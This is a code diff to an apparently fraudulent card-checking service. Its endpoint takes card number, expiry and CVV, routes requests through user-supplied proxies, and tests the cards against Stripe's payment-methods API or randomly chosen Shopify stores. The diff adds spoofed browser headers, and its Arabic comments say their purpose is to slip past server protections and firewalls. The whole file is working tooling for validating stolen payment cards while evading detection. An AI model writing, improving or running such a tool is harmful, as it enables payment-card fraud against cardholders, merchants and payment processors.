@@ -113,6 +113,15 @@ DEFAULT_SITES = [
     "https://freshwaterconservationcanada.myshopify.com", "https://getevo.myshopify.com", "https://coral-cottage-boutiques.myshopify.com"
 ]
 
+# الهيدرز القياسية لتقليد المتصفحات الحقيقية وتخطي حمايات السيرفرات الإلغائية
+BROWSER_HEADERS = {
+    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
+    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
+    "Accept-Language": "en-US,en;q=0.9",
+    "Cache-Control": "max-age=0",
+    "Connection": "keep-alive"
+}
+
 @app.get("/")
 async def check_card_gateway(
     cc: str = Query(..., description="Card details formatted as card|mm|yyyy|cvv"),
@@ -132,14 +141,11 @@ async def check_card_gateway(
         proxy_url = None
         if proxy:
             proxy_parts = proxy.split(':')
-            # إذا كان البروكسي قادم بصيغة IP:Port:User:Pass (4 أجزاء)
             if len(proxy_parts) == 4:
                 ip, port, user, password = proxy_parts[0], proxy_parts[1], proxy_parts[2], proxy_parts[3]
                 proxy_url = f"http://{user}:{password}@{ip}:{port}"
-            # إذا كان البروكسي قادم بصيغة IP:Port فقط (جزئين)
             elif len(proxy_parts) == 2:
                 proxy_url = f"http://{proxy}"
-            # أي صيغة أخرى قياسية مثل user:pass@ip:port مرسلة جاهزة
             else:
                 proxy_url = f"http://{proxy}" if not proxy.startswith("http") else proxy
 
@@ -151,7 +157,8 @@ async def check_card_gateway(
                 stripe_url = "https://api.stripe.com/v1/payment_methods"
                 headers = {
                     "Authorization": f"Bearer {pk}",
-                    "Content-Type": "application/x-www-form-urlencoded"
+                    "Content-Type": "application/x-www-form-urlencoded",
+                    "User-Agent": BROWSER_HEADERS["User-Agent"]
                 }
                 data = {
                     "type": "card",
@@ -195,7 +202,8 @@ async def check_card_gateway(
         # ----------------------------------------------------------------------
         else:
             target_url = url if url else random.choice(DEFAULT_SITES)
-            async with httpx.AsyncClient(proxy=proxy_url, timeout=25.0, follow_redirects=True) as client:
+            # تم إضافة المتصفح الافتراضي وقيم الاستجابة هنا لتخطي الجدران النارية
+            async with httpx.AsyncClient(proxy=proxy_url, timeout=25.0, follow_redirects=True, headers=BROWSER_HEADERS) as client:
                 response = await client.get(target_url)
                 
                 if response.status_code == 200:
